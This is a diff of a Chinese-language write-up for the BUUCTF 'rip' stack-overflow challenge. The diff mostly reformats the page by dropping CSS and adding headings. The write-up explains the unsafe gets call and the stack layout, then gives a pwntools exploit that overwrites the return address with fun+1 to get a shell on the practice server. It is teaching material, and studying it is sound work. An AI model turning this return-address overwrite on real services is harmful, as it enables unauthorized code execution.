@@ -1,59 +1,6 @@
-<style>
-.pretty-note {
-  max-width: 900px;
-  margin: 24px auto;
-  padding: 28px 34px;
-  border-radius: 14px;
-  border: 1px solid #e6e9ef;
-  background: linear-gradient(180deg, #fcfdff 0%, #f7faff 100%);
-  color: #1f2937;
-  line-height: 1.9;
-  font-size: 17px;
-  font-family: "LXGW WenKai", "Microsoft YaHei UI", "PingFang SC", "Noto Sans SC", sans-serif;
-}
 
-.pretty-note h1,
-.pretty-note h2 {
-  letter-spacing: 0.3px;
-  color: #0f172a;
-  font-family: "Source Han Serif SC", "STZhongsong", "Songti SC", serif;
-}
+# rip 栈溢出题型
 
-.pretty-note h1 {
-  font-size: 34px;
-  margin-bottom: 10px;
-}
-
-.pretty-note h2 {
-  margin-top: 30px;
-  border-left: 4px solid #2f6fed;
-  padding-left: 10px;
-}
-
-.pretty-note code,
-.pretty-note pre {
-  font-family: "JetBrains Mono", "Cascadia Code", Consolas, monospace;
-  font-size: 14px;
-}
-
-.pretty-note pre {
-  border-radius: 10px;
-  border: 1px solid #dbe3f0;
-  background: #f4f7fd;
-  padding: 14px 16px;
-}
-
-.pretty-note hr {
-  border: none;
-  height: 1px;
-  background: linear-gradient(90deg, transparent 0%, #bfd2ff 50%, transparent 100%);
-  margin: 26px 0;
-}
-</style>
-
-<div class="pretty-note">
-
-#rip 栈溢出题型
 本题需要工具：wsl(Ubuntu22.04)，ida,pwntools
 
 在做此题目之前，请先了解栈这种数据结构
@@ -73,6 +20,8 @@ pwn题目是通过攻破远程服务的漏洞来获取权限，故不需要像re
 继续跟踪发现
 fun：：
 
+### 关键函数
+
 ```c
 int fun()
 {
@@ -86,8 +35,9 @@ int fun()
 
 好我们回头看主函数
 
-```c
+### 主函数
 
+```c
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   char s[15]; // [rsp+1h] [rbp-Fh] BYREF
@@ -98,7 +48,6 @@ int __fastcall main(int argc, const char **argv, const char **envp)
   puts("ok,bye!!!");
   return 0;
 }
-
 ```
 
 char s[15]只容纳字节 但是gets是危险函数！
@@ -115,12 +64,11 @@ char s[15]只容纳字节 但是gets是危险函数！
 
 正常时候
 
-
 高地址
 
+### 正常栈结构
+
 ```text
-
-
 +------------------+
 |   调用者栈帧      |
 +------------------+ <-- ebp (调用者的)
@@ -135,11 +83,12 @@ char s[15]只容纳字节 但是gets是危险函数！
 
 我们的目标是
 
-```text
+### 覆盖返回地址目标
 
+```text
 +------------------+
 |   调用者栈帧      |
-+------------------+ 
++------------------+
 |   返回地址        |  ← 目标：覆盖这里
 +------------------+ <-- 旧的 ebp
 |   保存的 ebp      |  ← 也可能需要覆盖
@@ -160,8 +109,9 @@ char s[15]只容纳字节 但是gets是危险函数！
 
 接下来写payload
 
-```python
+### payload 脚本
 
+```python
 from pwn import *
 
 r = remote("node5.buuoj.cn",29241)
@@ -177,44 +127,46 @@ payload= b'A'*len + p64(f_addr+1)
 r.sendline(payload)
 
 r.interactive()
-
 ```
 
 详细解读payload
 
-r = remote("node5.buuoj.cn",29241)，远程连接服务器使用它的服务
+### 详细解读payload
 
-elf=ELF("./pwn1") 解析本地文件
+- r = remote("node5.buuoj.cn",29241)，远程连接服务器使用它的服务
 
-f_addr=elf.symbols['fun']找到他的地址
+- elf=ELF("./pwn1") 解析本地文件
 
-len为什么是15+8？
+- f_addr=elf.symbols['fun']找到他的地址
 
-15来源于char的15
+- len为什么是15+8？
 
-8指的是64位下 rbp的大小（rbp是用于局部变量的定位的，本题是用不上的），既然是一个定位符，我们不需要啊，也覆盖掉
+  15来源于char的15
 
-15+8结束了过后，就是函数的返回地址了，程序在局部函数执行完会去跳转到这个地址，那我们构造恶意的地址供他跳转也就是fun的地址
+  8指的是64位下 rbp的大小（rbp是用于局部变量的定位的，本题是用不上的），既然是一个定位符，我们不需要啊，也覆盖掉
+
+- 15+8结束了过后，就是函数的返回地址了，程序在局部函数执行完会去跳转到这个地址，那我们构造恶意的地址供他跳转也就是fun的地址
 
 于是payload
 
 ```python
-
 payload= b'A'*len + p64(f_addr+1)
-
 ```
 
 关于这个b A p64 +1的解释
 
-b: 把后面的东西换成字节如把A换成/x41放入char中（不换也行，垃圾数据来的，但是py不能拼接）所以转成字节
+### 关于这个b A p64 +1的解释
 
-b'A'*len就是填充，p64就是将一个字符串整数转成64位的地址
+- b: 把后面的东西换成字节如把A换成/x41放入char中（不换也行，垃圾数据来的，但是py不能拼接）所以转成字节
+
+- b'A'*len就是填充，p64就是将一个字符串整数转成64位的地址
 
 ---
 
 ## 交互与收尾
 
 最后发送，打开
+
 r.interactive()交互模式
 
 这是我们已获得了权限
@@ -224,7 +176,5 @@ ls查询
 发现flag
 
 cat 结束
-
-</div>
 
 
